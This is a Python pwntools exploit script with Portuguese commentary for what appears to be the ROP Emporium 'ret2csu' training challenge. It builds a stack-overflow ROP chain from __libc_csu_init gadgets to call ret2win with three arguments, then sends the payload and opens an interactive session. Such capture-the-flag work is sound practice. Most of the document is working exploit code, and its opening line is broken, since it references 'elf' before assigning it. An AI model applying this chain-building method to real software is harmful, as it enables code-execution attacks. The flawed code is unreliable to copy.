#!/usr/bin/env python3
# coding: utf-8

### PREPARATION ###
from pwn import *

elf = elf.context = ELF('ret2csu')
p = process(elf.path)

### EXPLAINED ###
'''
Bom vamos lá, o desafio consiste e chamar a ret2win() com 3 parâmetros
Aonde colocar esses parâmetros? Bom basta a gente saber das calling convention da AMD64
Ela diz o seguinte:
RDI - Primeiro Param
RSI - Segundo Param
RDX - Terceiro Param

Fácil né? A gente só precisa achar gadgets para colocar os parâmetros em nossos registradores
Mas antes, quais são esses parâmetros? Bom isso o desafio nos dá o valor com 32bits porém estamos trabalhando com 64 bits
O que fazemos é basicamente colocar o mesmo valor duas vezes
Ficando assim:

first_param = 0xdeadbeefdeadbeef
second_param = 0xcafebabecafebabe
three_param = 0xd00df00dd00df00d

Então vamos começar a caçar nossos gadgets
Primeira tentativa:
ROPgadget --binary ret2csu --ropchain --only 'mov|pop|call|ret'

Unico retorno interessante:
0x00000000004006a3 : pop rdi ; ret
*Na verdade, temos um retorno de pop rsi, porém não vamos utilizar, você vai entender o motivo mais para frente*
Uma coisa legal que descobri é a possibilidade de achar gadgets com o gdb (com o peda pelo menos é possível)
gdb-peda$ break main
gdb-peda$ ropsearch <gadget> <full_path_to_binary>

Prosseguindo:
gdb-peda$ info functions -> mostra as funções presentes (se não executarmos ele mostrara apenas as funções externas, por conta do Lazy binding não ter carregado as funções estáticas do programa por não terem sidos utilizadas)
Duas coisas legais retornadas:
0x0000000000400640  __libc_csu_init (isso o desafio já falava para gente)
0x00000000004006b4  _fini (vamos entender o motivo disso mais pra frente)

Essas bibliotecas estão presentes em quase todos os binários, e elas são externas, o que nos ajuda pois não precisamos contar com a sorte de achar bons gadgets no binário
Olhando em __Libc_csu_init temos uma ROP Chain legal:

0x0000000000400680 <+64>:    mov    rdx,r15
0x0000000000400683 <+67>:    mov    rsi,r14
0x0000000000400686 <+70>:    mov    edi,r13d
0x0000000000400689 <+73>:    call   QWORD PTR [r12+rbx*8]
0x000000000040068d <+77>:    add    rbx,0x1
0x0000000000400691 <+81>:    cmp    rbp,rbx
0x0000000000400694 <+84>:    jne    0x400680 <__libc_csu_init+64>
0x0000000000400696 <+86>:    add    rsp,0x8
0x000000000040069a <+90>:    pop    rbx
0x000000000040069b <+91>:    pop    rbp
0x000000000040069c <+92>:    pop    r12
0x000000000040069e <+94>:    pop    r13
0x00000000004006a0 <+96>:    pop    r14
0x00000000004006a2 <+98>:    pop    r15
0x00000000004006a4 <+100>:   ret  

Bom, o que queremos é justamente manipular o RDX para adicionarmos o nosso terceiro parâmetro, olhe em <+64>
Lá está mov rdx, r15 - ou seja vamos manipular o r15 com o parâmetro
Mas para isso precisamos percorrer um longo percurso antes de chegar no ret, e com isso vem novos desafios, tais como o <+73> e o <+84>
Precisamos primeiro fazer ele chamar algo curto para evitar problemas
Depois precisamos fazer a cmp resultar igualdade para ele não entrar na __libc_csu_init+64, para evitar problemas
Perceba: quando digo evitar problemas é que dentro dessas funções pode ter instruções que podem modificar nossos registradores

Vamos separar essa ROP Chain em duas partes:
Primeira parte: <+90>, apelido: ropchain1
Segunda parte: <+64>, apelido: ropchain2

Na ropchain2 conseguimos manipular todos os registradores que vão ser utilizados na ropchain1
Então vamos achar uma solução para nossos erros:
Problema da call:
Vamos definir rbx = 0, pois assim ele fará rbx * 8, mas rbx é 0 e qualquer número multiplicado por 0 é 0
E em r12 colocamos o nosso endereço que queremos que ele entre, irei colocar o _fini, pois ele é muito simples e não modifica nenhum dos nossos registradores
Disassemble _fini:
   0x00000000004006b4 <+0>:     sub    rsp,0x8
   0x00000000004006b8 <+4>:     add    rsp,0x8
   0x00000000004006bc <+8>:     ret 

Ele entrara nessa função e no ret já dará continuidade a nossa ROP Chain

Primeiro problema resolvido
Segundo problema:
A cmp entre rbp e rbx precisa dar igual, olhe em <+86> o add rbx, 0x1
Ou seja resolvemos, basta definir rbp = 1 e rbx = 0, pois quando adicionar o 0x1 rbx = 1
Os dois são iguais!

O restante irei comentar na hora da escrita do exploit
'''

### ADDRESS & GADGETS & ARGUMENTS ###
'''
Não precismo comentar essa parte né?
Apenas estamos pegando o endereço da funçõ ret2win@plt, pegando o gadget pop_rdi e definindo os parâmetros
Depois definimos o ponteiro da função _fini, depois definimos o ropchain1 e ropchain2
'''

ret2win = 0x400510

pop_rdi = 0x4006a3		 # pop rdi ; ret

first_param = 0xdeadbeefdeadbeef
second_param = 0xcafebabecafebabe
third_param = 0xd00df00dd00df00d

fini_pointer = 0x600e48
first_rop = 0x40069a
second_rop = 0x400680

### RDX PROBLEM ###
# ROP Chain:
'''
# Second ROP:
0x0000000000400680 <+64>:    mov    rdx,r15
0x0000000000400683 <+67>:    mov    rsi,r14
0x0000000000400686 <+70>:    mov    edi,r13d
0x0000000000400689 <+73>:    call   QWORD PTR [r12+rbx*8]
0x000000000040068d <+77>:    add    rbx,0x1
0x0000000000400691 <+81>:    cmp    rbp,rbx
0x0000000000400694 <+84>:    jne    0x400680 <__libc_csu_init+64>

# First ROP:
0x000000000040069a <+90>:    pop    rbx
0x000000000040069b <+91>:    pop    rbp
0x000000000040069c <+92>:    pop    r12
0x000000000040069e <+94>:    pop    r13
0x00000000004006a0 <+96>:    pop    r14
0x00000000004006a2 <+98>:    pop    r15
0x00000000004006a4 <+100>:   ret
'''

### EXPLOIT ###
xpl = b''
xpl += b'A' * 40

# RDX ROP CHAIN
xpl += p64(first_rop)
xpl += p64(0) 				# rbx
xpl += p64(1) 				# rbp
xpl += p64(fini_pointer) 	# r12
xpl += p64(0) 				# r13
xpl += p64(second_param)	# r14
xpl += p64(third_param) 	# r15

#Olhe com atenção: rbp, r12, r14, r15
xpl += p64(second_rop)
# mov rdx, r15			# em r15 temos o nosso terceiro parâmetro, ele vai para RDX
# mov rsi, r14			# em r14 temos o nosso segundo parâmetro, ele vai para RSI
# mov edi, r13d
# call [r12+rbx*8] -> rbx = 0, 0*8 = 0, r12 = fini_pointer, ou seja, call fini_pointer
# add rbx, 0x1
# cmp rbp, rbx -> rbp = 1 e rbx = 1
# jne __libc_csu -> jump is not taken
# add rsp, 0x8

xpl += p64(0) # rbx
xpl += p64(0) # rbp
xpl += p64(0) # r12
xpl += p64(0) # r13
xpl += p64(0) # r14
xpl += p64(0) # r15
xpl += p64(0x4004e6) 		# um pequeno ret para corrigir o problema de alinhamento de 16 bytes da stack

xpl += p64(pop_rdi)
xpl += p64(first_param)		# RDI = primeiro parâmetro
xpl += p64(ret2win)			# chama a ret2win(rdi, rsi, rdx)

'''
Perceba que primeiros chamamos a ropchain1 para setar valores para quando a gente chamar a ropchain2 as condições forem satisfeitas, e também para setar os nosso parâmetros
E o programa conseguir seguir seu fluxo
'''

### EXECUTE ###
p.sendline(xpl)
p.interactive()

### SAVING ###
with open('payload', 'wb') as file:
	file.write(xpl)
